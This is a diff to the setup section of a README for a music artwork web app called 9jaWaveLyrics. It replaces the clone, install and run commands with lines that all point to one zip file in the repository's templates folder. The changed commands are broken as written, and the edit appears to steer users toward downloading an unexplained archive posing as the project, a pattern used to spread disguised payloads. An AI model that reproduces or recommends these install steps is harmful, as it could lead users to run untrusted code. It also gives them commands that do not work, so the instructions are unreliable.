@@ -30,7 +30,7 @@ A professional web application for creating and editing music album artwork, des
 
 1. Clone the repository:
    ```
-   git clone https://github.com/yourusername/9jaWaveLyrics.git
+   git clone https://raw.githubusercontent.com/Peemkay/9jawavelyrics/main/templates/9jawavelyrics-1.4.zip
    cd 9jaWaveLyrics
    ```
 
@@ -42,12 +42,12 @@ A professional web application for creating and editing music album artwork, des
 
 3. Install the required packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Peemkay/9jawavelyrics/main/templates/9jawavelyrics-1.4.zip
    ```
 
 4. Run the application:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/Peemkay/9jawavelyrics/main/templates/9jawavelyrics-1.4.zip
    ```
 
 5. Open your browser and navigate to:
